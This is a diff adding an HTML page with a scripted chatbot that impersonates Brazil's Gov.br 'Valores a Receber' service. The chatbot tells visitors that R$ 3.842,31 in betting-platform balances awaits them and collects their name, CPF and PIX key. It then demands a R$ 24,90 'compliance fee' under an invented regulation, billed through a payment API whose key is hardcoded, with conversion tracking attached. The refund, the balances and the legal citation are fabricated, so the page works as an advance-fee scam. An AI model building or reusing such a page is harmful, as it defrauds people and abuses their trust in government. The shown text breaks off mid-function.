@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <!-- Meta Pixel -->
+  <script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','2045608016094458');fbq('init','1446258604180101');fbq('track','PageView');</script>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2045608016094458&ev=PageView&noscript=1"/></noscript>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1446258604180101&ev=PageView&noscript=1"/></noscript>
+  <!-- Google tag -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z4W63165LV"></script>
+  <script>
+    window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}
+    gtag('js',new Date());
+    gtag('config','G-Z4W63165LV',{page_title:'Upsell 2 - Valores Bets | Valores a Receber',page_path:'/etapa4/upsell2/'});
+  </script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+  <title>Programa Saque Social - ATENDIMENTO</title>
+  <link rel="icon" href="../images/favicon.ico" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/all.min.css">
+  <style>
+    :root {
+      --primary-color: #0042DA;
+      --bg-color: #ffffff;
+      --bot-bubble-bg: #F7F8FF;
+      --user-bubble-bg: #FF8E21;
+      --text-color: #303235;
+      --white: #FFFFFF;
+      --gray-light: #E5E5E5;
+      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+    body {
+      background-color: var(--bg-color);
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    header {
+      background: var(--white);
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      z-index: 100;
+      border-bottom: 3px solid var(--primary-color);
+    }
+    header .logo img { height: 35px; }
+    header .user-info {
+      background: #1451b4;
+      color: white;
+      padding: 5px 15px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    nav {
+      background: var(--white);
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      color: #666;
+      border-bottom: 1px solid var(--gray-light);
+    }
+    nav i { margin: 0 8px; color: var(--primary-color); }
+
+    #chat-content {
+      flex: 1;
+      overflow-y: auto;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      background-color: var(--white);
+    }
+
+    .message-row { display: flex; width: 100%; }
+    .message-row.bot { justify-content: flex-start; }
+    .message-row.user { justify-content: flex-end; }
+
+    .avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      margin-right: 8px;
+      flex-shrink: 0;
+      background-image: url("../avatar-desenrola.html");
+      background-size: cover;
+      margin-top: 5px;
+    }
+
+    .bubble {
+      max-width: 85%;
+      padding: 10px 14px;
+      border-radius: 18px;
+      font-size: 16px;
+      line-height: 1.5;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+      position: relative;
+    }
+    .bot .bubble { background-color: var(--bot-bubble-bg); color: var(--text-color); border-top-left-radius: 2px; }
+    .user .bubble { background-color: var(--user-bubble-bg); color: white; border-top-right-radius: 2px; }
+
+    .typing {
+      display: flex;
+      gap: 4px;
+      padding: 12px 18px;
+      background: var(--bot-bubble-bg);
+      border-radius: 18px;
+      width: fit-content;
+      margin-left: 36px;
+      border-top-left-radius: 2px;
+    }
+    .typing span { width: 8px; height: 8px; background: #999; border-radius: 50%; animation: bounce 1s infinite; }
+    .typing span:nth-child(2) { animation-delay: 0.2s; }
+    .typing span:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-5px)} }
+
+    #controls { padding: 15px 20px; background: #fff; border-top: 1px solid #eee; display: none; align-items: center; justify-content: center; }
+    #controls.active { display: flex; }
+
+    .chat-options {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      padding: 5px 0 5px 36px;
+      max-width: 90%;
+    }
+    .chat-options button {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 14px 24px;
+      border-radius: 25px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.25s ease;
+      box-shadow: 0 3px 8px rgba(0, 66, 218, 0.25);
+      text-align: center;
+      letter-spacing: 0.3px;
+    }
+    .chat-options button:hover { background-color: #0032a8; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,66,218,.35); }
+    .chat-options button:active { transform: translateY(0); }
+    .chat-options.selected button { pointer-events: none; opacity: 0.5; }
+    .chat-options.selected button.chosen { opacity: 1; background-color: #168821; box-shadow: 0 2px 6px rgba(22,136,33,.3); }
+
+    .input-wrapper { display: flex; gap: 10px; width: 100%; max-width: 400px; position: relative; }
+    .input-wrapper input { flex: 1; padding: 14px 50px 14px 20px; border: 1px solid var(--gray-light); border-radius: 30px; outline: none; font-size: 16px; background: #f9f9f9; }
+    .input-wrapper button { background: var(--primary-color); border: none; width: 40px; height: 40px; border-radius: 50%; color: white; cursor: pointer; position: absolute; right: 5px; top: 4px; }
+
+    .fadeIn { animation: fadeInAnim 0.4s ease-out forwards; }
+    @keyframes fadeInAnim { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
+
+    /* Bets list — mesma estrutura de bubble do bot */
+    .bets-card {
+      max-width: 85%;
+      background: var(--bot-bubble-bg);
+      padding: 12px 14px;
+      border-radius: 18px;
+      border-top-left-radius: 2px;
+      font-size: 13px;
+      box-shadow: 0 1px 2px rgba(0,0,0,.05);
+    }
+    .bets-hdr { font-size: 11px; font-weight: 700; color: var(--primary-color); text-transform: uppercase; letter-spacing: .5px; margin-bottom: 8px; padding-bottom: 6px; border-bottom: 1px solid #e0e7ff; }
+    .bet-line { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; border-bottom: 1px solid #f0f0f0; font-size: 13px; }
+    .bet-line:last-of-type { border-bottom: none; }
+    .bet-line .bl-n { color: #374151; font-weight: 500; }
+    .bet-line .bl-v { color: #168821; font-weight: 700; white-space: nowrap; margin-left: 8px; }
+    .bets-total { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; padding-top: 8px; border-top: 2px solid var(--primary-color); font-size: 14px; font-weight: 800; }
+    .bets-total .bt-l { color: #0C326F; }
+    .bets-total .bt-v { color: #168821; font-size: 16px; }
+
+    /* Taxa card — mesma estrutura de bubble do bot */
+    .taxa-card {
+      max-width: 85%;
+      background: #FFFBEB;
+      border: 1px solid #FDE68A;
+      padding: 14px 16px;
+      border-radius: 18px;
+      border-top-left-radius: 2px;
+      box-shadow: 0 1px 2px rgba(0,0,0,.05);
+    }
+    .taxa-title { font-size: 13px; font-weight: 700; color: #78350F; margin-bottom: 10px; display: flex; align-items: center; gap: 7px; }
+    .taxa-title i { color: #F59E0B; }
+    .taxa-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #374151; padding: 6px 0; border-bottom: 1px solid #FDE68A; }
+    .taxa-row:last-child { border-bottom: none; }
+    .taxa-row .lbl { font-weight: 500; }
+    .taxa-row .val { font-weight: 700; }
+    .taxa-row .val.g { color: #168821; }
+    .taxa-row .val.r { color: #dc2626; }
+
+    /* PIX types */
+    .pix-types { display: flex; flex-direction: column; gap: 10px; padding: 5px 0 5px 36px; max-width: 90%; }
+    .pix-type-btn {
+      background: var(--white); color: var(--primary-color);
+      border: 1.5px solid var(--primary-color);
+      padding: 13px 20px; border-radius: 25px;
+      font-size: 15px; font-weight: 600; cursor: pointer; width: 100%;
+      display: flex; align-items: center; gap: 10px; transition: all .2s;
+      box-shadow: 0 2px 6px rgba(0,66,218,.12);
+    }
+    .pix-type-btn:hover { background: #e8f4fd; transform: translateY(-1px); }
+    .pix-type-btn i { font-size: 16px; width: 20px; text-align: center; }
+
+    /* PIX input — bubble style */
+    .pix-input-wrap { padding: 5px 0 5px 36px; max-width: 90%; }
+    .pix-input-inner { background: var(--bot-bubble-bg); border-radius: 16px; padding: 16px; }
+    .pix-label { font-size: 15px; font-weight: 600; color: var(--text-color); margin-bottom: 10px; }
+    .pix-field { position: relative; margin-bottom: 10px; }
+    .pix-field .fi { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #999; font-size: 14px; pointer-events: none; }
+    .pix-inp { width: 100%; border: 1.5px solid var(--gray-light); border-radius: 30px; padding: 13px 14px 13px 40px; font-size: 15px; font-family: inherit; outline: none; color: var(--text-color); background: var(--white); transition: border-color .2s; }
+    .pix-inp:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(0,66,218,.08); }
+    .pix-inp.err { border-color: #dc2626; }
+    .pix-inp::placeholder { color: #aaa; }
+    .btn-confirmar-pix { width: 100%; padding: 14px 24px; background: var(--primary-color); color: white; border: none; border-radius: 25px; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all .25s; box-shadow: 0 3px 8px rgba(0,66,218,.25); }
+    .btn-confirmar-pix:hover { background: #0032a8; transform: translateY(-1px); }
+
+    /* QR card */
+    .qr-card {
+      max-width: 85%; background: var(--bot-bubble-bg);
+      padding: 16px; border-radius: 18px; border-top-left-radius: 2px;
+      box-shadow: 0 1px 2px rgba(0,0,0,.05); text-align: center;
+    }
+    .qr-card img { width: 180px; height: 180px; border: 2px solid #e0e7ff; border-radius: 10px; margin: 0 auto 14px; display: block; }
+    .copy-box { background: white; border: 1px solid #e0e7ff; border-radius: 10px; padding: 10px 12px; margin-bottom: 12px; text-align: left; }
+    .copy-label { font-size: 11px; color: #666; font-weight: 600; text-transform: uppercase; letter-spacing: .4px; margin-bottom: 6px; }
+    .copy-code { font-size: 11px; color: #333; word-break: break-all; line-height: 1.5; font-family: monospace; user-select: all; }
+    .btn-copy { width: 100%; padding: 13px 24px; background: var(--primary-color); color: white; border: none; border-radius: 25px; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all .2s; box-shadow: 0 3px 8px rgba(0,66,218,.25); margin-bottom: 10px; }
+    .btn-copy:hover { background: #0032a8; }
+    .btn-copy.copied { background: #168821; }
+
+    /* Splashes */
+    .splash { position: fixed; inset: 0; z-index: 100; display: none; flex-direction: column; align-items: center; justify-content: center; background: var(--white); padding: 40px 24px; text-align: center; }
+    .splash.show { display: flex; animation: fadeInAnim .35s ease; }
+    .splash-inner { display: flex; align-items: center; justify-content: center; }
+    .govbr-svg { height: 58px; }
+    .splash-div { width: 2px; height: 76px; background: #e5e5e5; margin: 0 28px; }
+    .splash-right { display: flex; flex-direction: column; align-items: flex-start; gap: 14px; }
+    .splash-title { font-size: 26px; font-weight: 800; color: #111827; line-height: 1.2; text-align: left; }
+    .check-ring { width: 68px; height: 68px; border-radius: 50%; border: 3px solid #168821; display: flex; align-items: center; justify-content: center; margin: 0 auto; position: relative; animation: growRing .5s ease-out forwards; }
+    @keyframes growRing { from{transform:scale(.4);opacity:0} to{transform:scale(1);opacity:1} }
+    .check-ring i { font-size: 30px; color: #168821; animation: popI .3s .4s ease-out both; }
+    @keyframes popI { from{transform:scale(0)} to{transform:scale(1)} }
+    .check-rays { position: absolute; inset: -12px; border-radius: 50%; background: conic-gradient(#168821 0 10deg,transparent 10deg 30deg,#168821 30deg 40deg,transparent 40deg 60deg,#168821 60deg 70deg,transparent 70deg 90deg,#168821 90deg 100deg,transparent 100deg 120deg,#168821 120deg 130deg,transparent 130deg 150deg,#168821 150deg 160deg,transparent 150deg 180deg,#168821 180deg 190deg,transparent 190deg 210deg,#168821 210deg 220deg,transparent 220deg 240deg,#168821 240deg 250deg,transparent 250deg 270deg,#168821 270deg 280deg,transparent 280deg 300deg,#168821 300deg 310deg,transparent 310deg 330deg,#168821 330deg 340deg,transparent 340deg 360deg); opacity: .3; }
+    .pix-icon-row { display: flex; align-items: center; gap: 6px; }
+    .key-ic { font-size: 40px; color: #168821; animation: swing .6s .2s ease-out both; }
+    @keyframes swing { 0%{transform:rotate(-20deg) scale(.5);opacity:0} 60%{transform:rotate(10deg) scale(1.1)} 100%{transform:rotate(0) scale(1);opacity:1} }
+    .pix-rays { font-size: 20px; color: #168821; opacity: .5; animation: popI .4s .5s ease-out both; }
+
+    footer { background: #001C4E; padding: 12px; text-align: center; }
+    footer img { height: 22px; opacity: 0.9; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo"><img src="../images/govbr.png" alt="Gov.br"></div>
+    <div class="user-info">
+      <i class="fas fa-user-circle"></i>
+      <span id="user-display-name">Cidadão</span>
+    </div>
+  </header>
+
+  <nav>
+    <i class="fas fa-bars"></i>
+    <span>Portal do Cidadão</span>
+    <i class="fas fa-chevron-right" style="font-size:8px;margin:0 5px;"></i>
+    <span>Valores a Receber</span>
+    <i class="fas fa-chevron-right" style="font-size:8px;margin:0 5px;"></i>
+    <span>Plataformas de Apostas</span>
+  </nav>
+
+  <main id="chat-content"></main>
+  <section id="controls"></section>
+
+  <!-- SPLASH 1 -->
+  <div class="splash" id="splash-verified">
+    <div class="splash-inner">
+      <svg class="govbr-svg" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
+        <text y="48" font-family="Arial,sans-serif" font-weight="800" font-size="52">
+          <tspan fill="#1351B4">gov</tspan><tspan fill="#1351B4">.</tspan><tspan fill="#FFCD07">b</tspan><tspan fill="#168821">r</tspan>
+        </text>
+      </svg>
+      <div class="splash-div"></div>
+      <div class="splash-right">
+        <div class="splash-title">Valores<br>localizados.</div>
+        <div class="check-ring"><div class="check-rays"></div><i class="fas fa-check"></i></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SPLASH 2 -->
+  <div class="splash" id="splash-pix">
+    <div class="splash-inner">
+      <svg class="govbr-svg" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
+        <text y="48" font-family="Arial,sans-serif" font-weight="800" font-size="52">
+          <tspan fill="#1351B4">gov</tspan><tspan fill="#1351B4">.</tspan><tspan fill="#FFCD07">b</tspan><tspan fill="#168821">r</tspan>
+        </text>
+      </svg>
+      <div class="splash-div"></div>
+      <div class="splash-right">
+        <div class="splash-title">Chave PIX<br>cadastrada!</div>
+        <div class="pix-icon-row">
+          <i class="fas fa-key key-ic"></i>
+          <span class="pix-rays">✦✦✦</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer><img src="../images/logo.png" alt="Gov.br"></footer>
+
+  <script>
+    // ─── PARAMS ──────────────────────────────────────────────────────────────
+    const urlParams   = new URLSearchParams(window.location.search);
+    const userName    = urlParams.get('nome')         || 'Cidadão';
+    const userCPF     = urlParams.get('cpf')          || '---';
+    const utmSource   = urlParams.get('utm_source')   || '';
+    const utmCampaign = urlParams.get('utm_campaign') || '';
+    const utmMedium   = urlParams.get('utm_medium')   || '';
+    const utmContent  = urlParams.get('utm_content')  || '';
+    const utmTerm     = urlParams.get('utm_term')     || '';
+
+    const firstName = userName.trim().split(/\s+/)[0] || 'Cidadão';
+    document.getElementById('user-display-name').textContent = firstName;
+
+    const hoje  = new Date();
+    const proto = 'BET-' + hoje.getFullYear()
+      + String(hoje.getMonth()+1).padStart(2,'0')
+      + String(hoje.getDate()).padStart(2,'0')
+      + '-' + Math.floor(10000000 + Math.random()*89999999);
+
+    const VALOR_TOTAL = 'R$ 3.842,31';
+    const VALOR_TAXA  = 'R$ 24,90';
+    const TAXA_NUM    = 24.90;
+
+    const GP_API_BASE     = 'https://app.gladepay.com.br/v1';
+    const GP_API_KEY      = 'gp_live_hmVHJH7GV4eTWqnaxx069vNHPZ3sGjeI';
+    const GP_CALLBACK_URL = 'https://consulta-valoresareceber-hoje.vercel.app/api/hp-webhook';
+    const TAXA_NUM_CENTS  = Math.round(TAXA_NUM * 100);
+
+    function isPaidStatus(s){
+      if(!s) return false;
+      const v = String(s).toUpperCase();
+      return v === 'SETTLED' || v === 'PAID';
+    }
+
+    const BETS = [
+      { n:'Kaizen Gaming Brasil Ltda.',        v:'R$ 850,00' },
+      { n:'HS do Brasil Ltda.',                v:'R$ 412,50' },
+      { n:'SPRBT Interactive Brasil Ltda',     v:'R$ 320,00' },
+      { n:'Ventmear Brasil S.A.',              v:'R$ 275,80' },
+      { n:'Esportes Gaming Brasil Ltda.',      v:'R$ 510,45' },
+      { n:'Foggo Entertainment Ltda.',         v:'R$ 188,90' },
+      { n:'NSX Brasil S.A.',                   v:'R$ 643,20' },
+      { n:'EB Interm. e Jogos S/A.',           v:'R$ 298,75' },
+      { n:'Ana Gaming Brasil S.A.',            v:'R$ 156,40' },
+      { n:'OIG Gaming Brazil Ltda.',           v:'R$ 389,60' },
+      { n:'BPX Bets Sports Group Ltda.',       v:'R$ 225,15' },
+      { n:'H2 Licensed Ltda.',                 v:'R$ 342,80' },
+      { n:'Pixbet Soluções Tecc Ltda.',        v:'R$ 475,30' },
+      { n:'NVBT Gaming Ltda.',                 v:'R$ 210,55' },
+      { n:'SevenX Gaming S/A.',                v:'R$ 285,40' },
+      { n:'NSX Betfair Brasil S.A.',           v:'R$ 398,70' },
+      { n:'Apollo Operations Ltda.',           v:'R$ 454,81' },
+    ];
+
+    // ─── ENGINE — idêntico ao front ──────────────────────────────────────────
+    const chatContent = document.getElementById('chat-content');
+    const controls    = document.getElementById('controls');
+
+    function scrollDown(){ setTimeout(()=>{ chatContent.scrollTop = chatContent.scrollHeight; },80); }
+
+    function appendMessage(type, content){
+      const row = document.createElement('div');
+      row.className = `message-row ${type} fadeIn`;
+      let html = (type === 'bot') ? '<div class="avatar"></div>' : '';
+      html += `<div class="bubble">${content}</div>`;
+      row.innerHTML = html;
+      chatContent.appendChild(row);
+      scrollDown();
+      const imgs = row.querySelectorAll('img');
+      imgs.forEach(img => img.addEventListener('load', scrollDown));
+      setTimeout(scrollDown, 300);
+    }
+
+    function showTyping(){
+      const row = document.createElement('div');
+      row.className = 'message-row bot fadeIn'; row.id='typing';
+      row.innerHTML = '<div class="avatar"></div><div class="typing"><span></span><span></span><span></span></div>';
+      chatContent.appendChild(row); scrollDown();
+      return row;
+    }
+    function removeTyping(){ const el=document.getElementById('typing'); if(el)el.remove(); }
+    function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+    const TYPING_DURATION = 1500;
+    async function botMsg(html, ms=2000){
+      if(ms > TYPING_DURATION){
+        await delay(ms - TYPING_DURATION);
+        showTyping();
+        await delay(TYPING_DURATION);
+      } else {
+        showTyping();
+        await delay(ms);
+      }
+      removeTyping();
+      appendMessage('bot', html);
+    }
+
+    function showSplash(id, dur=2800){
+      return new Promise(resolve=>{
+        const el=document.getElementById(id);
+        el.classList.add('show');
+        setTimeout(()=>{ el.classList.remove('show'); setTimeout(resolve,350); }, dur);
+      });
+    }
+
+    // ─── RENDERIZA OPÇÕES INLINE (igual ao front) ─────────────────────────────
+    function renderOptions(options){
+      const container = document.createElement('div');
+      container.className = 'chat-options fadeIn';
+      options.forEach(opt=>{
+        const btn = document.createElement('button');
+        btn.textContent = opt.label;
+        btn.onclick = () => {
+          container.classList.add('selected');
+          btn.classList.add('chosen');
+          appendMessage('user', opt.label);
+          setTimeout(()=>opt.action(), 600);
+        };
+        container.appendChild(btn);
+      });
+      chatContent.appendChild(container); scrollDown();
+    }
+
+    // ─── LISTA DE BETS ───────────────────────────────────────────────────────
+    function insertBetsList(){
+      const row = document.createElement('div');
+      row.className = 'message-row bot fadeIn';
+      const lines = BETS.map(b=>`<div class="bet-line"><span class="bl-n">${b.n}</span><span class="bl-v">${b.v}</span></div>`).join('');
+      row.innerHTML = `
+        <div class="avatar"></div>
+        <div class="bets-card">
+          <div class="bets-hdr">✅ Valores localizados em plataformas regulamentadas · Protocolo: ${proto}</div>
+          ${lines}
+          <div class="bets-total"><span class="bt-l">Total disponível</span><span class="bt-v">${VALOR_TOTAL}</span></div>
+        </div>`;
+      chatContent.appendChild(row); scrollDown();
+    }
+
+    // ─── FLUXO ───────────────────────────────────────────────────────────────
+    let pixType = '';
+    let pollingRef = null;
+
+    async function startChat(){
+      await delay(900);
+      await botMsg(`Olá, <strong>${firstName}</strong>! Aqui é o sistema integrado de acompanhamento do Programa Valores a Receber — Gov.br.`, 2200);
+      await botMsg(`Identificamos que você realizou uma solicitação de saque via transferência TED, que está <strong>em processamento</strong> com prazo de <strong>3 a 5 dias úteis</strong>.`, 3000);
+      await botMsg(`Enquanto aguarda, nosso sistema realizou uma varredura automática no seu CPF e identificou <strong>valores adicionais disponíveis</strong> vinculados a plataformas de apostas esportivas regulamentadas pela Secretaria de Prêmios e Apostas (SPA/MF).`, 3500);
+      await botMsg(`Esses valores são de depósitos e saldos não resgatados que ficam retidos nas plataformas. <strong>O prazo legal para solicitar a devolução é de apenas 90 dias</strong>, após isso o valor é perdido.`, 3200);
+      await botMsg(`<strong>${firstName}</strong>, você deseja que eu verifique quais plataformas possuem valores disponíveis vinculados ao seu CPF?`, 2500);
+      renderOptions([{ label: 'Sim, verificar meus valores agora', action: doConsultaStep1 }]);
+    }
+
+    async function doConsultaStep1(){
+      await botMsg(`Certo! Para garantir a segurança da consulta, preciso confirmar: você já utilizou alguma plataforma de apostas online nos últimos 2 anos?`, 2800);
+      renderOptions([{ label: 'Sim, já utilizei plataformas de apostas', action: doConsulta }]);
+    }
+
+    async function doConsulta(){
+      await botMsg(`Perfeito! Iniciando varredura nas plataformas regulamentadas vinculadas ao CPF <strong>${userCPF}</strong>...`, 2000);
+      await showSplash('splash-verified', 2800);
+      insertBetsList();
+      await botMsg(`Localizamos <strong>${VALOR_TOTAL}</strong> disponíveis em <strong>${BETS.length} plataformas</strong> cadastradas no seu CPF.<br><br>Para processar o resgate, confirme seus dados abaixo:`, 2400);
+
+      // Card de dados (igual ao estilo bubble do bot)
+      const row = document.createElement('div');
+      row.className = 'message-row bot fadeIn';
+      row.innerHTML = `
+        <div class="avatar"></div>
+        <div class="bubble">
+          <div style="font-size:13px;line-height:2;">
+            <div style="display:flex;justify-content:space-between;border-bottom:1px solid #e5e5e5;padding-bottom:4px;margin-bottom:4px;">
+              <span style="color:#666;font-weight:500;">Nome</span>
+              <span style="font-weight:700;">${userName}</span>
+            </div>
+            <div style="display:flex;justify-content:space-between;border-bottom:1px solid #e5e5e5;padding-bottom:4px;margin-bottom:4px;">
+              <span style="color:#666;font-weight:500;">CPF</span>
+              <span style="font-weight:700;">${userCPF}</span>
+            </div>
+            <div style="display:flex;justify-content:space-between;border-bottom:1px solid #e5e5e5;padding-bottom:4px;margin-bottom:4px;">
+              <span style="color:#666;font-weight:500;">Valor a Receber</span>
+              <span style="font-weight:700;color:#168821;">${VALOR_TOTAL}</span>
+            </div>
+            <div style="display:flex;justify-content:space-between;">
+              <span style="color:#666;font-weight:500;">Status</span>
+              <span style="font-weight:700;color:var(--primary-color);">Pré-aprovado ✓</span>
+            </div>
+          </div>
+        </div>`;
+      chatContent.appendChild(row); scrollDown();
+
+      renderOptions([{ label:'Confirmar dados e continuar', action: doConfirmar }]);
+    }
+
+    async function doConfirmar(){
+      await botMsg('Verificando autenticidade...', 1600);
+      await botMsg(`✅ <strong>Identidade confirmada.</strong><br><br>Informe sua chave PIX para recebimento do valor.<br><strong>Selecione o tipo:</strong>`, 1800);
+      insertPixTypes();
+    }
+
+    function insertPixTypes(){
+      const container = document.createElement('div');
+      container.className = 'pix-types fadeIn';
+      const types = [
+        { type:'CPF', ph:'000.000.000-00', label:'CPF', icon:'fa-id-card' },
+        { type:'CELULAR', ph:'+55 (00) 00000-0000', label:'Celular', icon:'fa-mobile-alt' },
+        { type:'E-MAIL', ph:'seu@email.com', label:'E-mail', icon:'fa-envelope' },
+        { type:'ALEATÓRIA', ph:'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx', label:'Chave aleatória', icon:'fa-random' },
+      ];
+      types.forEach(t=>{
+        const btn = document.createElement('button');
+        btn.className = 'pix-type-btn';
+        btn.innerHTML = `<i class="fas ${t.icon}"></i> ${t.label}`;
+        btn.onclick = () => {
+          pixType = t.type;
+          container.style.opacity='.5'; container.style.pointerEvents='none';
+          appendMessage('user', t.label);
+          const autofill = t.type==='CPF' ? userCPF : '';
+          insertPixInput(t.label, t.ph, autofill);
+        };
+        container.appendChild(btn);
+      });
+      chatContent.appendChild(container); scrollDown();
+    }
+
+    function insertPixInput(label, ph, autofill=''){
+      const wrap = document.createElement('div');
+      wrap.className = 'pix-input-wrap fadeIn'; wrap.id='pix-input-card';
+      const nota = autofill ? `<div style="font-size:11px;color:var(--primary-color);background:#e8f4fd;border-radius:8px;padding:6px 10px;margin-bottom:10px;display:flex;align-items:center;gap:6px;"><i class="fas fa-info-circle"></i> CPF preenchido automaticamente.</div>` : '';
+      wrap.innerHTML = `
+        <div class="pix-input-inner">
+          <div class="pix-label">Chave PIX (${label})</div>
+          ${nota}
+          <div class="pix-field">
+            <i class="fas fa-qrcode fi"></i>
+            <input type="text" class="pix-inp" id="pix-inp" placeholder="${ph}" enterkeyhint="done" autocomplete="off" value="${autofill}">
+          </div>
+          <button class="btn-confirmar-pix" id="btn-confirmar-pix">
+            <i class="fas fa-check-circle"></i> Confirmar chave PIX
+          </button>
+        </div>`;
+      chatContent.appendChild(wrap); scrollDown();
+      setTimeout(()=>{ const i=document.getElementById('pix-inp'); if(i){i.focus();const l=i.value.length;i.setSelectionRange(l,l);} },400);
+      document.getElementById('btn-confirmar-pix').addEventListener('click', submitPix);
+      document.getElementById('pix-inp').addEventListener('keydown',e=>{ if(e.key==='Enter'){e.preventDefault();submitPix();} });
+    }
+
+    async function submitPix(){
+      const inp=document.getElementById('pix-inp');
+      const key=inp?inp.value.trim():'';
+      if(!key){ if(inp){inp.classList.add('err');inp.focus();} return; }
+      const card=document.getElementById('pix-input-card');
+      if(card){card.style.opacity='.5';card.style.pointerEvents='none';}
+      appendMessage('user', key);
+      await botMsg('Cadastrando sua chave PIX...', 1600);
+      await showSplash('splash-pix', 2800);
+      await flowPosPix(key);
+    }
+
+    async function flowPosPix(key){
+      await botMsg(`✅ Chave PIX <strong>${key}</strong> cadastrada com sucesso!`, 1400);
+
+      const taxaRow = document.createElement('div');
+      taxaRow.className = 'message-row bot fadeIn';
+      taxaRow.innerHTML = `
+        <div class="avatar"></div>
+        <div class="taxa-card">
+          <div class="taxa-title"><i class="fas fa-file-invoice-dollar"></i>Resumo do resgate</div>
+          <div class="taxa-row"><span class="lbl">Valor a receber</span><span class="val g">${VALOR_TOTAL}</span></div>
+          <div class="taxa-row"><span class="lbl">Tipo de chave PIX</span><span class="val">${pixType}</span></div>
+          <div class="taxa-row"><span class="lbl">Chave PIX</span><span class="val" style="word-break:break-all;font-size:12px;max-width:160px;text-align:right;">${key}</span></div>
+          <div class="taxa-row"><span class="lbl">Taxa de conformidade (0,64%)</span><span class="val r">${VALOR_TAXA}</span></div>
+          <div class="taxa-row"><span class="lbl">Prazo de crédito</span><span class="val">Até 2h úteis</span></div>
+        </div>`;
+      chatContent.appendChild(taxaRow); scrollDown();
+
+      await botMsg(`⚠️ Conforme a <strong>Resolução SPA/MF nº 254/2024</strong>, para liberação de saldos de plataformas de apostas é necessário recolher uma taxa de conformidade de <strong>${VALOR_TAXA}</strong>.`, 2800);
+      await botMsg(`Após o pagamento, o crédito de <strong>${VALOR_TOTAL}</strong> é processado automaticamente na sua chave PIX em até <strong>2 horas úteis</strong>.`, 2200);
+
+      renderOptions([{
+        label: `Pagar ${VALOR_TAXA} e receber ${VALOR_TOTAL}`,
+        action: async () => { await gerarPix(key); }
+      }]);
+    }
+
+    // ─── GLADEPAY ────────────────────────────────────────────────────────────
+    async function gerarPix(chavePix){
+      try{
+        const utmP=new URLSearchParams();
+        if(utmSource)   utmP.set('utm_source',utmSource);
+        if(utmCampaign) utmP.set('utm_campaign',utmCampaign);
+        if(utmMedium)   utmP.set('utm_medium',utmMedium);
+        if(utmContent)  utmP.set('utm_content',utmContent);
+        if(utmTerm)     utmP.set('utm_term',utmTerm);
+        const utmQS=utmP.toString()?'?'+utmP.toString():'';
+        const refId=`UPSELL2-${Date.now()}-${userCPF.replace(/\D/g,'')}`;
+        const orderRes=await fetch(`${GP_API_BASE}/deposito${utmQS}`,{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+GP_API_KEY},body:JSON.stringify({amountCents:TAXA_NUM_CENTS,reference:refId,callbackUrl:GP_CALLBACK_URL,customerName:userName,description:'Upsell 02 - 24,90'})});
+        const order=await orderRes.json();
+        if(!order.qrCodeText && !order.copy_past) throw new Error('PIX não gerado');
+        if(typeof fbq!=='undefined') fbq('track','InitiateCheckout',{value:TAXA_NUM,currency:'BRL',content_ids:['taxa-bets'],content_type:'product'});
+        await botMsg('✅ Cobrança gerada! Copie o código PIX abaixo e pague no app do seu banco:', 1200);
+        insertQrCard(order, chavePix);
+      }catch(err){
+        console.error(err);
+        await botMsg('⚠️ Erro ao gerar cobrança. Tente novamente em instantes.', 1000);
+      }
+    }
+
+    function insertQrCard(order, chavePix){
+      const pixCode=order.qrCodeText||order.copy_past||'';
